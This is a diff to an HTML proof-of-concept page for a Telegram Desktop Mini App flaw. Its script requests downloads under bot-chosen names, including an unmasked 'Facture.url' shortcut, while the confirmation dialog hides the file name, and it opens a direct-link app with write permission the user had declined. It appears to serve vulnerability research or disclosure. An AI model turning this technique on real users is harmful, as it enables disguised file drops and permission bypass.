@@ -1,22 +1,14 @@
 <!doctype html>
 <!--
-PoC - Telegram Desktop Mini App download dialog hides the file name.
+PoC - Telegram Desktop Mini App download dialog hides the file name, and the
+save-time masking only covers .lnk/.scf, so a bot-chosen .url name is written
+unmasked into Downloads/Telegram Desktop/.
 
-Host this page over HTTPS, set it as a bot's Menu Button (or a direct-link
-Web App) in @BotFather, then open it from Telegram Desktop 7.3.2.
-
-(a) web_app_request_file_download: the confirmation box only says
-    "<bot> suggests you download the following file:" with no name, extension,
-    URL or size (inline_bot_downloads.cpp DownloadFileBox; the file-preview
-    row is commented out). After "Download" the file is written to
-    <Downloads>/Telegram Desktop/<bot-chosen name> with no save dialog
-    (askDownloadPath defaults to false); only .lnk/.scf are masked
-    (data_document.cpp FileNameForSave).
-
-(b) web_app_open_tg_link to a <bot>/<app> direct link reaches
-    WebViewInstance::resolveApp -> requestApp(true), i.e.
-    messages.requestAppWebView with write_allowed set, even if the user
-    unticked "Allow <bot> to send you messages".
+Button (a): downloads a .txt (name "Report (final).txt").
+Button (b): downloads a benign internet shortcut under the name "Facture.url"
+            (content points to telegram.org; this only tests that the .url
+            extension is written unmasked, not credential theft).
+Button (c): web_app_open_tg_link to a direct-link app with write_allowed.
 -->
 <html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
 <title>download dialog test</title>
@@ -24,23 +16,20 @@ Web App) in @BotFather, then open it from Telegram Desktop 7.3.2.
 button{display:block;width:100%;padding:14px;margin:10px 0;font-size:15px}
 code{background:#eee;padding:2px 4px;border-radius:3px;word-break:break-all}</style>
 </head><body>
-<p>This Mini App will ask Telegram to download:</p>
-<p>name: <code id="n"></code><br>url: <code id="u"></code></p>
-<button onclick="dl()">(a) request download</button>
-<button onclick="tg()">(b) open app with write_allowed</button>
+<p>This Mini App asks Telegram to download a file whose name it chooses:</p>
+<button onclick="dl('Report (final).txt','poc.txt')">(a) download as "Report (final).txt"</button>
+<button onclick="dl('Facture.url','shortcut.url')">(b) download as "Facture.url"</button>
+<button onclick="tg()">(c) open app with write_allowed</button>
 <p id="log"></p>
 <script>
-var FILE_NAME = 'Report (final).txt';
-var FILE_URL = location.origin + location.pathname.replace(/[^/]*$/, '') + 'poc.txt';
-document.getElementById('n').textContent = FILE_NAME;
-document.getElementById('u').textContent = FILE_URL;
+function here(f){ return location.origin + location.pathname.replace(/[^/]*$/, '') + f; }
 function post(ev, data) {
   if (window.TelegramWebviewProxy) window.TelegramWebviewProxy.postEvent(ev, JSON.stringify(data));
   else if (window.parent) window.parent.postMessage(JSON.stringify({eventType: ev, eventData: data}), '*');
-  document.getElementById('log').textContent = 'sent ' + ev + ' at ' + new Date().toLocaleTimeString();
+  document.getElementById('log').textContent = 'sent ' + ev + ' (' + JSON.stringify(data) + ')';
 }
-function dl() {
-  post('web_app_request_file_download', { url: FILE_URL, file_name: FILE_NAME });
+function dl(name, file) {
+  post('web_app_request_file_download', { url: here(file), file_name: name });
 }
 function tg() {
   post('web_app_open_tg_link', { path_full: '/poccchunterbot/app' });
